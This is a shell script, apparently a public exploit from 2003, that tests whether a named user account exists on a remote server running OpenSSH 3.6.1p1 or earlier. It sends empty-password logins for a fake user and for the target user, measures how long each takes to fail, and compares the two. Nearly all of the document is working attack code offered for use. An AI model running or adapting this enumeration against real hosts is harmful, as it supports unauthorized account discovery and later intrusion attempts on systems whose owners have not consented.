#!/bin/sh
# OpenSSH <= 3.6.1p1 - User Identification.
# Nicolas Couture - nc@stormvault.net
#
# Description:
#	-Tells you wether or not a user exist on
#	  a distant server running OpenSSH.
# 
# Usage:
#	-You NEED to have the host's public key
#	  before executing this script. 
#


#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#
# Fact Sheet:					#
#	  o It is really accurate against	#
#	    redhat boxes.			#
# 	  o Linux boxes running grsecurity	#
#	    has 10 seconds delay on both	#
#	    valid AND invalid user login	#
#	    attempts.				#
#	  o *BSD boxes are not vulnerables and  #
#	     always has 10 seconds delay like   #
#	     Linux-Grsec + network protection   #
#						#
#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#

#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#
# History:				    #
#	 Thu May  1 15:41:18 EDT 2003 	    #
#	  ; Script started.		    #
#	 Thu May  1 16:42:30 EDT 2003	    #
#	  ; Script is functional.	    #
#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#

# Let the user know how we work.
usage(){
 echo "$0 <user> <host>"
 exit 1
}

# Verify the arguments.
[ $# != 2 ] && usage

# Variables.
USER="$1"
HOST="$2"

#=-=-=-=-=-=-=-=-=-=-=-=-=#
# Expect script functions #
#=-=-=-=-=-=-=-=-=-=-=-=-=#

# Expect script for password.
expasswd() {
cat << EOF > expasswd 
spawn $SSHCMD
expect password:
send '\r'
interact
EOF
}

# Expect script for error.
experror() {
cat << EOF > experror
spawn expect -f expasswd
expect again.
exit 1593
interact
EOF
}

#=-=-=-=-=-=-=-=-=-=#
# -Fake user timing #
#=-=-=-=-=-=-=-=-=-=#

# OpenSSH client command for inexisting user.
export SSHCMD="ssh nicolas_couture@$HOST"

# Build new expect script.
expasswd
experror

# Timing.
FDATE0=`date '+%s'`
echo "[-] Calculating fake user timeout..."
expect -f experror 1> /dev/null 2> /dev/null
FDATE1=`date '+%s'`

# Fake user timeout.
FUTO=`echo $FDATE1 - $FDATE0 | bc`
echo "[+] Found $FUTO."

#=-=-=-=-=-=-=-=#
# -$USER timing #
#=-=-=-=-=-=-=-=#

# OpenSSH command.
export SSHCMD="ssh $USER@$HOST"

# Build new expect scripts.
expasswd
experror

DATE0=`date '+%s'`
echo "[-] Calculating $USER timeout on $HOST..."
expect -f experror 1> /dev/null 2> /dev/null
DATE1=`date '+%s'`

# $USER timeout.
END=`echo $DATE1 - $DATE0 | bc`
echo "[+] Found $END."

#=-=-=-=-=#
# -Result #
#=-=-=-=-=#

if [ "$FUTO" -eq "$END" ] && [ "$FUTO" -eq "10" ]; then
 echo "This box is not vulnerable."
 exit 1
fi

# Use of our magic skills.
if [ "$FUTO" -lt "$END" ]; then
 echo "$USER exist on $HOST."
elif [ "$FUTO" -ge "$END" ]; then
 echo "$USER doesn't exist on $HOST."
else
 echo "Segmentation fault."
 exit 13
fi

# Remove tmp files.
rm -rf expasswd experror

# EOF

